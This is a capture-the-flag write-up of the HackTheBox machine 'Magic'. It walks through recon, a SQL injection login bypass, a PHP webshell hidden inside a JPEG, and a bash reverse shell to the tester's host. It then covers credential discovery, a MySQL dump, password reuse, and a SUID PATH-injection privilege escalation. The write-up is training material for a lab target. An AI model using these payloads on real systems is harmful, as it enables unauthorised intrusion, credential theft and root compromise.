---
render_with_liquid: false
title: HackTheBox Writeup  Magic
date: 2024-02-08 17:47:25 +1400
tags: [hackthebox, nmap, linux, feroxbuster, php, auth-bypass, sqli, mysql, file-upload, file-upload-bypass, webshell, htaccess, misconfiguration, discover-secrets, mysqldump, password-reuse, suid, path-injection, oscp-like]
---



# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Magic]
└─$ pt init '10.129.207.97 Magic'
+---------+--------+---------------+--------+
| PROFILE | STATUS |      IP       | DOMAIN |
+---------+--------+---------------+--------+
| magic   | on     | 10.129.207.97 | Magic  |
+---------+--------+---------------+--------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Thu Feb  8 17:47:25 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, Magic
Nmap scan report for Magic (10.129.207.97)
Host is up, received user-set (0.084s latency).
Scanned at 2024-02-08 17:47:25 CST for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu Feb  8 17:47:35 2024 -- 1 IP address (1 host up) scanned in 10.15 seconds
```

## 80 - HTTP : Image gallery


### Info

```ruby
http://Magic [200] [Magic Portfolio] [Apache/2.4.29 (Ubuntu)] [Apache HTTP Server:2.4.29,Ubuntu] [3ed46a47dce0bd988ae17069390eea134acc822b]
```

![](/assets/obsidian/dbdfe35f0f65cbec51fbd76d76e3dd34.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Magic]
└─$ feroxbuster -t 20 -w /usr/share/dirb/wordlists/common.txt -u 'http://Magic/' -o ferox_80_common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://Magic/
 🚀  Threads               │ 20
 📖  Wordlist              │ /usr/share/dirb/wordlists/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80_common.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      270c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      267c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        2l      119w    12085c http://magic/assets/js/jquery.poptrox.min.js
200      GET       88l      506w    34251c http://magic/images/fulls/2.jpg
200      GET      835l     1757w    16922c http://magic/assets/css/main.css
200      GET      587l     1232w    12433c http://magic/assets/js/util.js
200      GET       16l       41w      280c http://magic/assets/css/noscript.css
200      GET      192l     1093w    88071c http://magic/images/fulls/5.jpeg
200      GET      209l      457w    32922c http://magic/images/fulls/1.jpg
200      GET        2l       87w     2439c http://magic/assets/js/breakpoints.min.js
200      GET      490l     2867w   223637c http://magic/images/uploads/logo.png
200      GET     3315l     6597w   390337c http://magic/images/fulls/6.jpg
200      GET      118l      277w     4221c http://magic/login.php
200      GET        2l       51w     1851c http://magic/assets/js/browser.min.js
200      GET      151l      677w    68311c http://magic/images/uploads/magic-hat_23-2147512156.jpg
200      GET     6721l    34616w  2627822c http://magic/images/fulls/3.jpg
200      GET      154l      597w    47229c http://magic/images/uploads/hacked.jpg
200      GET      154l      597w    47229c http://magic/images/uploads/.png
200      GET      154l      597w    47229c http://magic/images/uploads/x00.png
301      GET        9l       28w      299c http://magic/assets => http://magic/assets/
200      GET      296l     2079w   173684c http://magic/images/uploads/magic-1424x900.jpg
200      GET        2l     1276w    88145c http://magic/assets/js/jquery.min.js
200      GET      390l      896w     8862c http://magic/assets/js/main.js
200      GET     1118l     7764w   656671c http://magic/images/uploads/trx.jpg
200      GET      255l     1421w   121103c http://magic/images/uploads/magic-wand.jpg
200      GET        0l        0w  1455770c http://magic/images/uploads/giphy.gif
200      GET        0l        0w  5289209c http://magic/images/uploads/7.jpg
200      GET       60l      228w     4509c http://magic/
301      GET        9l       28w      303c http://magic/assets/css => http://magic/assets/css/
301      GET        9l       28w      299c http://magic/images => http://magic/images/
200      GET       60l      228w     4511c http://magic/index.php
301      GET        9l       28w      302c http://magic/assets/js => http://magic/assets/js/
301      GET        9l       28w      310c http://magic/assets/css/images => http://magic/assets/css/images/
301      GET        9l       28w      313c http://magic/assets/css/images/ie => http://magic/assets/css/images/ie/
301      GET        9l       28w      307c http://magic/images/uploads => http://magic/images/uploads/
[####################] - 51s    36999/36999   0s      found:33      errors:1
[####################] - 24s     4614/4614    193/s   http://Magic/
[####################] - 25s     4614/4614    181/s   http://magic/
[####################] - 21s     4614/4614    220/s   http://magic/assets/
[####################] - 20s     4614/4614    227/s   http://magic/assets/css/
[####################] - 20s     4614/4614    229/s   http://magic/images/
[####################] - 20s     4614/4614    226/s   http://magic/assets/js/
[####################] - 21s     4614/4614    219/s   http://magic/assets/css/images/
[####################] - 20s     4614/4614    230/s   http://magic/images/uploads/
```

# User Flag
---

## Shell as www-data


### Login bypass

> http://magic/login.php

Payload : `admin'; -- -`

![](/assets/obsidian/6f2f554d69f2bba77543b2cba35c2d03.png)

![](/assets/obsidian/cca9679f114fb208702fe5e15be7ea70.png)

### Webshell upload bypass with magic bytes

- It only allow files ending with `jpg, jpeg, png`

![](/assets/obsidian/7ea4809ebd2e30204f05c2d7f02bd040.png)

- If the magic bytes are not allowed, it will return `What are you trying to do there?`

![](/assets/obsidian/ad28460f7d1971b166ad142340719eab.png)

Create a dummy jpg file for testing

```bash
┌──(bravosec㉿fsociety)-[~/htb/Magic]
└─$ convert -size 100x100 xc:white white_100x100.jpg
```

Append php code

```bash
┌──(bravosec㉿fsociety)-[~/htb/Magic]
└─$ echo '<?php phpinfo(); ?>' > phpinfo.php

┌──(bravosec㉿fsociety)-[~/htb/Magic]
└─$ cat white_100x100.jpg phpinfo.php > white.jpg
```

It was successfully uploaded

![](/assets/obsidian/1545c51b2dc587081846028ecad79252.png)

> In normal cases, I will need to find LFI in order to execute the php code
> 
> But in this case, renaming the filename to `white.php.jpg` made it executable due to `.htaccess`'s configuration
{: .prompt-info }

![](/assets/obsidian/a271dc78f4c250a64bc4331b0615448e.png)

![](/assets/obsidian/99cb587b8a4f55155901afc954635231.png)

`disable_functions` doesn't blacklist `system()`, upload a webshell

Payload : `<?php system($_REQUEST[0]); ?>`

![](/assets/obsidian/deb55716d0c4b2f6483fbbc152cfbddf.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Magic]
└─$ curl http://magic/images/uploads/white.php.jpg --data-urlencode '0=id' --output -
JFIFHHC





 $.' ",#(7),01444'9=82<.342
                          d??uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse shell

```bash
curl http://magic/images/uploads/white.php.jpg --data-urlencode '0=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.9/1111 0>&1"'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Magic/www]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.207.97] 39634
bash: cannot set terminal process group (1185): Inappropriate ioctl for device
bash: no job control in this shell
www-data@magic:/var/www/Magic/images/uploads$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ds$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@magic:/var/www/Magic/images/uploads$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Magic/www]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@magic:/var/www/Magic/images/uploads$ stty rows 50 columns 209
www-data@magic:/var/www/Magic/images/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@magic:/var/www/Magic/images/uploads$
```


## From www-data to theseus


### Reason why jpg can execute php code

The regex that match `.+\.ph(p([3457s]|\-s)?|t|tml)` will be executed as php

```bash
www-data@magic:/var/www/Magic$ cat .htaccess
<FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)">
SetHandler application/x-httpd-php
</FilesMatch>
<Files ~ "\.(sh|sql)">
   order deny,allow
   deny from all
```

### Enumeration

```bash
www-data@magic:/var/www/Magic$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
```

```bash
www-data@magic:/var/www/Magic$ find . -type f -exec ls -latr {} + 2>/dev/null
[...]
-rwxr-xr-x 1 www-data www-data     359 Sep 27  2019 ./assets/css/images/arrow.svg
-rw-r--r-- 1 www-data www-data     881 Oct 16  2019 ./db.php5
-rw-r--r-- 1 www-data www-data   59661 Oct 17  2019 ./images/hey.jpg
[...]
```

```bash
www-data@magic:/var/www/Magic$ cat ./db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
[...]
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
[...]
```

Tried password reuse but failed

```bash
www-data@magic:/var/www/Magic$ su - theseus
Password:iamkingtheseus
su: Authentication failure
```

### Dump MYSQL database

`mysql` wasn't installed

```bash
www-data@magic:/var/www/Magic$ mysql

Command 'mysql' not found, but can be installed with:
```

We can use `mysqldump` instead to skip port forwarding

```bash
www-data@magic:/var/www/Magic$ mysqldump -u theseus -p'iamkingtheseus' -A
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database:
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `Magic`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `Magic`;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-02-08  4:32:55
```

### Password reuse

```bash
www-data@magic:/var/www/Magic$ su - theseus
Password:Th3s3usW4sK1ng
theseus@magic:~$ id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
theseus@magic:~$ cat ~/user.txt
eb411e445db3b36a33ef1eff40b1ed2c
theseus@magic:~$
```

# Root Flag
---

## From theseus to root


### SUID - Path injection

I noticed the abnormal group `users`, the only binary it owns was `/bin/sysinfo` that have SUID set as root

```bash
theseus@magic:~$ find / -type f -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -not -path "/var/lib/*" -group users -ls 2>/dev/null
   393232     24 -rwsr-x---   1 root     users       22040 Oct 21  2019 /bin/sysinfo
```

```bash
theseus@magic:~$ file /bin/sysinfo
/bin/sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped
```

After running it, it just gathers a bunch of system information

```bash
theseus@magic:~$ /bin/sysinfo
[...]
====================MEM Usage=====================
              total        used        free      shared  buff/cache   available
Mem:           3.8G        586M        1.8G        6.8M        1.5G        3.0G
Swap:          1.0G          0B        1.0G
```

Debug with `ltrace`, it have `setuid(0)` that gives root for current context

And `popen()` calls a binary without full path, so I can do path injection

```bash
theseus@magic:~$ ltrace /bin/sysinfo
_ZNSt8ios_base4InitC1Ev(0x556a0c1ef131, 0xffff, 0x7ffcb0411568, 128)                                                             = 0
__cxa_atexit(0x7fda9b52ba40, 0x556a0c1ef131, 0x556a0c1ef008, 6)                                                                  = 0
setuid(0)                                                                                                                        = -1
setgid(0)                                                                                                                        = -1
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x556a0c1ef020, 0x556a0bfed8f8, -160, 0)                                 = 0x556a0c1ef020
_ZNSolsEPFRSoS_E(0x556a0c1ef020, 0x7fda9b59b870, 0x556a0c1ef020, 0x556a0bfed92d====================Hardware Info====================
)                                                 = 0x556a0c1ef020
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev(0x7ffcb0411430, 0x556a0bfed92e, 0, 2880)                               = 0x7ffcb0411440
popen("lshw -short", "r")                                                                                                        = 0x556a0d435280
fgets(WARNING: you should run this program as super-user.
```

Since the `popen()` have `"r"` argument, I will not get interactive shell

Give bash SUID instead

```bash
theseus@magic:~$ cp /bin/bash /tmp/b
theseus@magic:~$ echo -e '#!/bin/bash\nchown root:root /tmp/b && chmod +s /tmp/b' > /tmp/lshw
theseus@magic:~$ chmod +x /tmp/lshw
theseus@magic:~$ export PATH=/tmp:$PATH
theseus@magic:~$ /bin/sysinfo
[...]
```

```bash
theseus@magic:~$ ls -la /tmp/b
-rwsr-sr-x 1 root root 1113504 Feb  8 04:50 /tmp/b
theseus@magic:~$ /tmp/b -p
b-4.4# id
uid=1000(theseus) gid=1000(theseus) euid=0(root) egid=0(root) groups=0(root),100(users),1000(theseus)
b-4.4# cat /root/root.txt
c8321a307c3248704ac285978a1bfb53
b-4.4#
```

# Additional
---
